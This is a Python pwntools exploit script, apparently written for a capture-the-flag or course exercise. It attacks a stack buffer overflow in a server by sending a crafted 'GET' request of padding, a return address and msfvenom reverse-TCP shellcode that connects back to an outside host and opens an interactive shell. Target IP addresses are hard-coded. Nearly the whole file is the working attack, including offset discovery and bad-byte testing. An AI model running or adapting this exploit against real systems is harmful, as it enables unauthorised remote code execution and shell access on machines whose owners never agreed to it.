# -*- coding: utf-8 -*-
#!/usr/bin/env python
#   Version
#   Author: WildfootW
#   GitHub: github.com/WildfootW
#   Copyright (C) 2019 WildfootW All rights reserved.
#


from pwn import *
#from my_pwn_tools import *

def print_payload(payload, message = None):
    if message != None:
        log.info(message)
    log.info("payload: " + str(payload))
    log.info("payload length: " + str(len(payload)))

context.arch = "amd64"
context.os = "linux"
# ["CRITICAL", "DEBUG", "ERROR", "INFO", "NOTSET", "WARN", "WARNING"]
context.log_level = "DEBUG"
#context.terminal = ["tmux", "split-window"] # ["gnome-terminal", "-x", "sh", "-c"] # ["tmux", "neww"]

is_local = True
#  is_local = False
#r = process("./a.out")  #r = process("./a.out", env={"LD_PRELOAD" : "./libc.so.6"})
#r.close()
# ELF("/lib/x86_64-linux-gnu/libc-2.27.so") # ELF("/lib/i386-linux-gnu/libc-2.27.so")
#libc = ELF("./libc.so")

host = "localhost"
port = 8888
#  host = '140.112.243.72'
#  port = 8888

if not is_local:
    host = "59.124.168.42"
    port = 8001
r = remote(host, port)

# test stack overflow ###
#  cyclic_str = cyclic(5000, n = 8)
#  payload = flat(["GET ", cyclic_str, " "])
#  #payload = flat(["GET ", "A" * 1004, "W" * 8, " "]) # check again
#  print_payload(payload)
#  r.sendline(payload)
#  log.info(cyclic_find(p64(0x6161616266616161), n = 8)) # 1004

'''
pwndbg> x/20gx 0x402355
0x402355:       0x6161616161616161      0x6161616161616162
0x402365:       0x6161616161616163      0x6161616161616164
0x402375:       0x6161616161616165      0x6161616161616166
0x402385:       0x6161616161616167      0x6161616161616168
0x402395:       0x6161616161616169      0x616161616161616a
0x4023a5:       0x616161616161616b      0x616161616161616c
0x4023b5:       0x616161616161616d      0x616161616161616e
0x4023c5:       0x616161616161616f      0x0061006161616170
0x4023d5:       0x0300000000000000      0x0400000000000000
'''
ret_addr = 0x402355
ret_addr = 0x600a95

### test bad bytes ###
#bad_bytes =  b""
#bad_bytes += b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
#bad_bytes += b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
#bad_bytes += b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
#bad_bytes += b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
#bad_bytes += b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
#bad_bytes += b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
#bad_bytes += b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
#bad_bytes += b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
#bad_bytes += b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
#bad_bytes += b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
#bad_bytes += b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
#bad_bytes += b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
#bad_bytes += b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
#bad_bytes += b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
#bad_bytes += b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
#bad_bytes += b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff\x00"
#payload = flat(["GET ", bad_bytes, "A" * (1004 - len(bad_bytes)), ret_addr, " "]) # check again

# msfvenom -p linux/x64/shell_reverse_tcp LHOST=140.112.243.72 LPORT=7777 â€“e x86/shikata_ga_nai -f python
shellcode =  b""
shellcode += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
shellcode += b"\x97\x48\xb9\x02\x00\x1e\x61\x8c\x70\xf3\x48\x51\x48"
shellcode += b"\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"
shellcode += b"\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"
shellcode += b"\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"
shellcode += b"\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"


buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
buf += b"\x97\x48\xb9\x02\x00\x1a\x0a\x8c\x70\xc4\xe4\x51\x48"
buf += b"\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"
buf += b"\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"
buf += b"\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"
buf += b"\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"
shellcode = buf
shellcode = b"\x90" * 8 + shellcode

#shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

payload = flat(["GET ", shellcode, "A" * (1004 - len(shellcode)), ret_addr, " "]) # check again
print_payload(payload)
r.sendline(payload)
r.interactive("Pwned # ")


